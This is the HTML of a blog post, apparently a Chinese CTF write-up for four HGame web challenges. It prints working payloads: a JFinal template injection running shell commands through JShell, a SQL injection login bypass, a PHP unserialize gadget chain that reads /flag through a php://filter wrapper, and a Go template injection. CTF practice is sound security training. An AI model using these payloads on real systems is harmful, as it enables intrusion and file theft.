@@ -1,0 +1,442 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)"><meta name="generator" content="Hexo 7.3.0">
+<link rel="preconnect" href="https://cdnjs.cloudflare.com" crossorigin>
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+  <meta name="google-site-verification" content="Eu0uQYpKZX6Sx1fdlifKq0tyJnqDfDvRkD1G2XFhyAE">
+  <meta name="msvalidate.01" content="727D1DF0A0AC0A64A8481B3E086EEE18">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/7.0.0/css/all.min.css" integrity="sha256-VHqXKFhhMxcpubYf9xiWdCiojEbY9NexQ4jh8AxbvcM=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/themes/blue/pace-theme-minimal.css">
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/pace.min.js" integrity="sha256-gqd7YTjg/BtfqWSwsJOvndl0Bxc8gFImLEkXQT8+qj0=" crossorigin="anonymous" defer></script>
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"blog.mmitsuha.xyz","root":"/","images":"/images","scheme":"Gemini","darkmode":true,"version":"8.26.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"codeblock":{"theme":{"light":"github","dark":"github-dark-dimmed"},"prism":{"light":"prism","dark":"prism-dark"},"copy_button":{"enable":true,"style":"mac"},"fold":{"enable":true,"height":500},"language":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":true,"pangu":true,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":true,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":true,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js" defer></script>
+
+    <meta name="description" content="Enjoy Coffee本题是一个 Jar 文件，使用了 JFinal 的模版引擎，逆向后 render 代码如下 123456789101112131415161718public class indexController {  @RequestMapping({&quot;&#x2F;&quot;})  public String Index() {    return &quot;Try to use Enjoy Templat">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HGame Mini Writeup">
+<meta property="og:url" content="https://blog.mmitsuha.xyz/2024/09/19/13/index.html">
+<meta property="og:site_name" content="Mitsuha&#39;s Blog">
+<meta property="og:description" content="Enjoy Coffee本题是一个 Jar 文件，使用了 JFinal 的模版引擎，逆向后 render 代码如下 123456789101112131415161718public class indexController {  @RequestMapping({&quot;&#x2F;&quot;})  public String Index() {    return &quot;Try to use Enjoy Templat">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://blog.mmitsuha.xyz/2024/09/19/13/vidarmail1.png">
+<meta property="og:image" content="https://blog.mmitsuha.xyz/2024/09/19/13/vidarmail2.png">
+<meta property="og:image" content="https://blog.mmitsuha.xyz/2024/09/19/13/mynotebook1.png">
+<meta property="og:image" content="https://blog.mmitsuha.xyz/2024/09/19/13/mynotebook2.png">
+<meta property="article:published_time" content="2024-09-19T16:42:13.000Z">
+<meta property="article:modified_time" content="2025-12-28T05:05:35.810Z">
+<meta property="article:author" content="Mitsuha">
+<meta property="article:tag" content="hgame">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://blog.mmitsuha.xyz/2024/09/19/13/vidarmail1.png">
+
+
+<link rel="canonical" href="https://blog.mmitsuha.xyz/2024/09/19/13/">
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://blog.mmitsuha.xyz/2024/09/19/13/","path":"/2024/09/19/13/","title":"HGame Mini Writeup"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>HGame Mini Writeup | Mitsuha's Blog</title>
+  
+
+
+
+  <script defer src='https://static.cloudflareinsights.com/beacon.min.js' data-cf-beacon='{&quot;token&quot;: &quot;b9f35cfe27e3457f9ab1648369f9d983&quot;}'></script>
+
+
+
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous" defer></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/lozad.js/1.16.0/lozad.min.js" integrity="sha256-mOFREFhqmHeQbXpK2lp4nA3qooVgACfh88fpJftLBbc=" crossorigin="anonymous" defer></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/pangu/7.2.0/pangu.umd.js" integrity="sha256-JnmRRnJK7DC6RQJbAJb6AXOM9OmWzS6z8eYultk/48Y=" crossorigin="anonymous" defer></script>
+<script src="/js/utils.js" defer></script><script src="/js/motion.js" defer></script><script src="/js/sidebar.js" defer></script><script src="/js/next-boot.js" defer></script>
+
+  
+
+
+
+
+  <script src="/js/third-party/pace.js" defer></script>
+
+
+  
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">Mitsuha's Blog</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">君の名は。</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li><li class="menu-item menu-item-friends"><a href="/friends/" rel="section"><i class="fa fa-link fa-fw"></i>友链</a></li><li class="menu-item menu-item-sitemap"><a href="/sitemap.xml" rel="section"><i class="fa fa-sitemap fa-fw"></i>站点地图</a></li>
+  </ul>
+</nav>
+
+
+
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Enjoy-Coffee"><span class="nav-number">1.</span> <span class="nav-text">Enjoy Coffee</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Vidar-Mail"><span class="nav-number">2.</span> <span class="nav-text">Vidar Mail</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#My-Notebook"><span class="nav-number">3.</span> <span class="nav-text">My Notebook</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Go-AHead"><span class="nav-number">4.</span> <span class="nav-text">Go AHead</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Mitsuha"
+      src="/images/avatar.jpg">
+  <p class="site-author-name" itemprop="name">Mitsuha</p>
+  <div class="site-description" itemprop="description">🏳️‍⚧️ An anime lover and C++ & Rust programming blog</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">6</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">2</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">2</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/mmitsuha" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;mmitsuha" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i></a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:mmitsuha@outlook.com" title="E-Mail → mailto:mmitsuha@outlook.com" rel="noopener me" target="_blank"><i class="fa fa-envelope fa-fw"></i></a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://twitter.com/miymitsuha" title="Twitter → https:&#x2F;&#x2F;twitter.com&#x2F;miymitsuha" rel="noopener me" target="_blank"><i class="fab fa-twitter fa-fw"></i></a>
+      </span>
+  </div>
+  <div class="cc-license animated" itemprop="license">
+    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" class="cc-opacity" rel="noopener" target="_blank"><img src="https://cdnjs.cloudflare.com/ajax/libs/creativecommons-vocabulary/2020.11.3/assets/license_badges/small/by_nc_sa.svg" alt="Creative Commons"></a>
+  </div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://blog.mmitsuha.xyz/2024/09/19/13/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="Mitsuha">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Mitsuha's Blog">
+      <meta itemprop="description" content="🏳️‍⚧️ An anime lover and C++ & Rust programming blog">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="HGame Mini Writeup | Mitsuha's Blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          HGame Mini Writeup
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2024-09-20 01:42:13" itemprop="dateCreated datePublished" datetime="2024-09-20T01:42:13+09:00">2024-09-20</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2025-12-28 14:05:35" itemprop="dateModified" datetime="2025-12-28T14:05:35+09:00">2025-12-28</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
+        </span>
+    </span>
+
+  
+    <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv">
+      <span class="post-meta-item-icon">
+        <i class="far fa-eye"></i>
+      </span>
+      <span class="post-meta-item-text">阅读次数：</span>
+      <span id="busuanzi_value_page_pv"></span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><h2 id="Enjoy-Coffee"><a href="#Enjoy-Coffee" class="headerlink" title="Enjoy Coffee"></a>Enjoy Coffee</h2><p>本题是一个 Jar 文件，使用了 JFinal 的模版引擎，逆向后 render 代码如下</p>
+<figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">indexController</span> {</span><br><span class="line">  <span class="meta">@RequestMapping({"/"})</span></span><br><span class="line">  <span class="keyword">public</span> String <span class="title function_">Index</span><span class="params">()</span> {</span><br><span class="line">    <span class="keyword">return</span> <span class="string">"Try to use Enjoy Template Engine."</span>;</span><br><span class="line">  }</span><br><span class="line">  </span><br><span class="line">  <span class="meta">@RequestMapping({"/render"})</span></span><br><span class="line">  <span class="keyword">public</span> String <span class="title function_">read</span><span class="params">(<span class="meta">@RequestParam</span> String tmpl)</span> {</span><br><span class="line">    <span class="keyword">try</span> {</span><br><span class="line">      <span class="type">Engine</span> <span class="variable">engine</span> <span class="operator">=</span> Engine.use();</span><br><span class="line">      engine.setStaticMethodExpression(<span class="literal">true</span>);</span><br><span class="line">      <span class="type">Template</span> <span class="variable">template</span> <span class="operator">=</span> engine.getTemplateByString(tmpl);</span><br><span class="line">      <span class="keyword">return</span> template.renderToString();</span><br><span class="line">    } <span class="keyword">catch</span> (Exception e) {</span><br><span class="line">      <span class="keyword">return</span> e.toString();</span><br><span class="line">    } </span><br><span class="line">  }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
+
+<span id="more"></span>
+
+<p>看到一个 <code>setStaticMethodExpression(true)</code>，提示我们使用静态方法，然后看到了一个同样是 <a target="_blank" rel="noopener" href="https://pankas.top/2023/11/13/2023%E6%B5%99%E6%B1%9F%E7%9C%81%E8%B5%9B%E5%86%B3%E8%B5%9Bweb-wp/">JFinal 的 CTF 题</a>，得知构造 <code>JShell</code> 然后再通过 <code>getRuntime().exec()</code> 来执行 <code>Shell命令</code>的方法。<del>通过 ChatGPT</del>，构造出如下字符串 <del>(其实题目改之前我就知道 <code>flag</code> 在根目录下😈)</del>：</p>
+<p><code>#((jdk.jshell.JShell::create()).eval('new java.util.Scanner(java.lang.Runtime.getRuntime().exec("ls /").getInputStream()).useDelimiter("\\A").next()'))</code></p>
+<p>获取到如下输出：</p>
+<p><code>[SnippetEvent(snippet=Snippet:VariableKey($1)#1-new java.util.Scanner(java.lang.Runtime.getRuntime().exec("ls /").getInputStream()).useDelimiter("\\A").next(),previousStatus=NONEXISTENT,status=VALID,isSignatureChange=true,causeSnippetnullvalue="app\nbF14g_asg7f8as9\nbash\nbin\nboot\ndev\netc\nflag\nhome\nlib\nlib64\nmedia\nmnt\nopt\nproc\nreadflag\nroot\nrun\nsbin\nsrv\nsys\ntmp\nusr\nvar\n")]</code></p>
+<p>可以看到根目录下有 <code>bF14g_asg7f8as9</code>，<code>readflag</code>，<code>flag</code>，这几个奇怪🤔的文件，修改命令，一个个 <code>cat</code> 过去。<br>最终在 <code>bF14g_asg7f8as9</code> 中获取到了 <code>flag</code>🎊。</p>
+<h2 id="Vidar-Mail"><a href="#Vidar-Mail" class="headerlink" title="Vidar Mail"></a>Vidar Mail</h2><p>题目下载一看，在 <code>login</code> 函数下看到了喜闻乐见的 <code>sql注入</code>，可注入的语句如下</p>
+<figure class="highlight go"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">query := <span class="string">"SELECT username FROM users WHERE username = '"</span> + user.Username + <span class="string">"' AND password = '"</span> + user.Password + <span class="string">"'"</span></span><br></pre></td></tr></tbody></table></figure>
+
+<p>然后目光来到 <code>flagchecker</code> 函数内，貌似需要满足一定的条件（用户为 <code>admin</code>，发的邮件内容为 <code>where is my flag</code>，收件人为 <code>flagholder</code>）才能获取到 <code>flag</code></p>
+<figure class="highlight go"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">query := <span class="string">"SELECT id FROM emails WHERE sender = 'admin' AND body = 'where is my flag' AND receivers ='flagholder'"</span></span><br></pre></td></tr></tbody></table></figure>
+
+<p>于是开始通过注入登陆 <code>admin</code> 账号，密码为<code>' or '1'='1</code>。登入后开始发送邮件。<br><img data-src="/2024/09/19/13/vidarmail1.png" alt="vidarmail1"></p>
+<p>然后打开 <code>/check</code> 页面，获取到了 <code>flag</code>🎊。<br><img data-src="/2024/09/19/13/vidarmail2.png" alt="vidarmail2"></p>
+<h2 id="My-Notebook"><a href="#My-Notebook" class="headerlink" title="My Notebook"></a>My Notebook</h2><p>打开之后用开发者工具看一下，把网页源码藏在了 <code>/www.zip</code> 下。看到如下登陆代码：<br><img data-src="/2024/09/19/13/mynotebook1.png" alt="mynotebook1"></p>
+<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">'REQUEST_METHOD'</span>] == <span class="string">'POST'</span>){</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">'check-code-1'</span>]) || !<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">'check-code-2'</span>])){</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$_POST</span>[<span class="string">'check-code-1'</span>] == <span class="variable">$_POST</span>[<span class="string">'check-code-2'</span>]){</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"&lt;script&gt;alert('The checkcodes cannot be equalled or empty!')&lt;/script&gt;"</span>);</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">'check-code-1'</span>]) == <span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">'check-code-2'</span>])){</span><br><span class="line">        <span class="variable">$_SESSION</span>[<span class="string">'username'</span>] = <span class="string">'admin'</span>;</span><br><span class="line">        <span class="variable">$_SESSION</span>[<span class="string">'session_id'</span>] = <span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">stringToRandom</span>(<span class="number">16</span>));</span><br><span class="line">        <span class="title function_ invoke__">header</span>(<span class="string">"Location:index.php"</span>);</span><br><span class="line">    }<span class="keyword">else</span>{</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"&lt;script&gt;alert('The md5 of two checkcodes should be equalled!')&lt;/script&gt;"</span>);</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
+
+<p>告诉我们通过 <code>POST</code> 请求，并且两个 <code>code</code> 要不一样，但是 <code>md5</code> 一样，网上随便找个 <code>md5</code> 碰撞的字符串：<code>s878926199a</code> 和 <code>s155964671a</code>。<br>然后看到一个 <code>save.php</code> 和 <code>get.php</code> 用来存储和读取数据的，但是读取的时候有如下语句：</p>
+<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">is_serialized</span>(<span class="variable">$total</span>[<span class="variable">$i</span>])) {</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$total</span>[<span class="variable">$i</span>]);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
+
+<p>会将存储的数据 <code>unserialize</code>，这就给了我们执行代码的机会。在 <code>mainclass</code> 中有许多奇怪的类：</p>
+<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HereWeGo</span></span>{</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$try</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>{</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="keyword">try</span>-&gt;<span class="title function_ invoke__">gogogo</span>();</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">GoGoGo</span></span>{</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$go</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$go</span></span>)</span></span><br><span class="line"><span class="function">    </span>{</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;go = <span class="variable">$go</span>;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$name</span>,<span class="variable">$arguments</span></span>)</span>{</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;go-&gt;web;</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Evil</span></span>{</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$final</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span></span>)</span>{</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;file = <span class="variable">$file</span>;</span><br><span class="line">    }</span><br><span class="line">    <span class="comment">//The flag is in /flag</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$Attribute</span></span>)</span>{</span><br><span class="line">        <span class="variable">$result</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;file);</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">'/vidar/i'</span>,<span class="variable">$result</span>)){</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="keyword">final</span> = <span class="string">"HACKER!!!"</span>;</span><br><span class="line">            <span class="title function_ invoke__">file_put_contents</span>(<span class="string">'flag.txt'</span>,<span class="variable">$this</span>-&gt;<span class="keyword">final</span>);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        }</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="keyword">final</span> = <span class="variable">$result</span>;</span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="string">'flag.txt'</span>,<span class="variable">$this</span>-&gt;<span class="keyword">final</span>);</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
+
+<p><code>HereWeGo</code> 类会在解构的时候执行 <code>try</code> 中的 <code>gogogo</code> 方法，而 <code>GoGoGo</code> 类不管调用什么，都会返回 <code>go</code> 中的 <code>web</code> 成员。而 <code>Evil</code> 类在获取成员时会读取 <code>file</code>，但是其中有一个正则过滤，导致我们无法直接读取 <code>flag</code>，但是我们可以使用 <code>php</code> 内置的 <code>php://filter/read=convert.base64-encode/resource=/flag</code> 来将 <code>flag</code> 以 <code>base64</code> 的形式输出。<br>构造以下代码：</p>
+<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$evil</span> = <span class="keyword">new</span> <span class="title class_">Evil</span>(<span class="string">"php://filter/read=convert.base64-encode/resource=/flag"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建 GoGoGo 对象，传入 Evil 对象</span></span><br><span class="line"><span class="variable">$gogogo</span> = <span class="keyword">new</span> <span class="title class_">GoGoGo</span>(<span class="variable">$evil</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建 HereWeGo 对象，传入 GoGoGo 对象</span></span><br><span class="line"><span class="variable">$herewego</span> = <span class="keyword">new</span> <span class="title class_">HereWeGo</span>();</span><br><span class="line"><span class="variable">$herewego</span>-&gt;<span class="keyword">try</span> = <span class="variable">$gogogo</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 序列化 HereWeGo 对象</span></span><br><span class="line"><span class="variable">$serialized</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$herewego</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$serialized</span>;</span><br></pre></td></tr></tbody></table></figure>
+
+<p>最终获取到了 <code>flag</code>。<br><img data-src="/2024/09/19/13/mynotebook2.png" alt="mynotebook2"></p>
+<h2 id="Go-AHead"><a href="#Go-AHead" class="headerlink" title="Go AHead"></a>Go AHead</h2><p>是 <code>gin</code> 中的模板注入。看到程序往 <code>Request</code> 中加了 <code>flag</code>，构造模板读取 <code>Request</code>：<code>{{.Request}}</code>。输出：</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">{GET /?tmpl=%7B%7B.Request%7D%7D HTTP/1.1 1 1 map[Accept:[*/*] Accept-Encoding:[gzip, deflate, br] Postman-Token:[d1aae680-4970-4078-9819-c9d5d03df0fe] User-Agent:[PostmanRuntime/7.41.2] Yourgift:[VIDAR{555bd130523df71e332784955363a940f36bc2e8}</span><br><span class="line">]] {} &lt;nil&gt; 0 [] false 182.202.178.28:32664 map[] map[] &lt;nil&gt; map[] 10.88.0.1:41768 /?tmpl=%7B%7B.Request%7D%7D &lt;nil&gt; &lt;nil&gt; &lt;nil&gt; 0xc00007c3c0 &lt;nil&gt; [] map[]}</span><br></pre></td></tr></tbody></table></figure>
+
+<p>直接获取到 <code>flag</code>。</p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          
+
+<div class="post-copyright">
+<ul>
+  <li class="post-copyright-author">
+      <strong>本文作者： </strong>Mitsuha
+  </li>
+  <li class="post-copyright-link">
+      <strong>本文链接：</strong>
+      <a href="https://blog.mmitsuha.xyz/2024/09/19/13/" title="HGame Mini Writeup">https://blog.mmitsuha.xyz/2024/09/19/13/</a>
+  </li>
+  <li class="post-copyright-license">
+      <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+          <div class="followme">
+  <span>欢迎关注我的其它发布渠道</span>
+
+  <div class="social-list">
+
+      <div class="social-item">
+          <a target="_blank" class="social-link" href="https://twitter.com/miymitsuha">
+            <span class="icon">
+              <i class="fab fa-twitter"></i>
+            </span>
+
+            <span class="label">Twitter</span>
+          </a>
+      </div>
+  </div>
+</div>
+
+          <div class="post-tags">
